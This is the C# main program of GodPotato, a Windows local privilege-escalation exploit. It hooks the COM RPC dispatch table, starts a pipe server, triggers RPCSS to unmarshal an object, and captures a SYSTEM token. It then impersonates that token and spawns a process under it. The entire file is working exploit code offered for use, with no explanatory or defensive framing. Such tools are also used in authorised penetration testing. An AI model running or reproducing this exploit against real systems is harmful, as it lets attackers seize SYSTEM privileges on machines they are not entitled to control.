using System;
using System.IO;
using GodPotato.NativeAPI;
using System.Security.Principal;
using SharpToken;
using static GodPotato.ArgsParse;

namespace GodPotato
{
    internal class Program
    {

        static void Main(string[] args)
        {
            TextWriter ConsoleWriter = Console.Out;

            try
            {
                GodPotatoContext godPotatoContext = new GodPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());

                ConsoleWriter.WriteLine("[*] CombaseModule: 0x{0:x}", godPotatoContext.CombaseModule);
                ConsoleWriter.WriteLine("[*] DispatchTable: 0x{0:x}", godPotatoContext.DispatchTablePtr);
                ConsoleWriter.WriteLine("[*] UseProtseqFunction: 0x{0:x}", godPotatoContext.UseProtseqFunctionPtr);
                ConsoleWriter.WriteLine("[*] UseProtseqFunctionParamCount: {0}", godPotatoContext.UseProtseqFunctionParamCount);

                ConsoleWriter.WriteLine("[*] HookRPC");
                godPotatoContext.HookRPC();
                ConsoleWriter.WriteLine("[*] Start PipeServer");
                godPotatoContext.Start();

                GodPotatoUnmarshalTrigger unmarshalTrigger = new GodPotatoUnmarshalTrigger(godPotatoContext);
                try
                {
                    ConsoleWriter.WriteLine("[*] Trigger RPCSS");
                    int hr = unmarshalTrigger.Trigger();
                    ConsoleWriter.WriteLine("[*] UnmarshalObject: 0x{0:x}", hr);
                    
                }
                catch (Exception e)
                {
                    ConsoleWriter.WriteLine(e);
                }


                WindowsIdentity systemIdentity = godPotatoContext.GetToken();
                if (systemIdentity != null)
                {
                    ConsoleWriter.WriteLine("[*] CurrentUser: " + systemIdentity.Name);
                    TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token);
                }
                else
                {
                    ConsoleWriter.WriteLine("[!] Failed to impersonate security context token");
                }
                godPotatoContext.Restore();
                godPotatoContext.Stop();
            }
            catch (Exception e)
            {
                ConsoleWriter.WriteLine("[!] " + e.Message);

            }

        }
    }
}
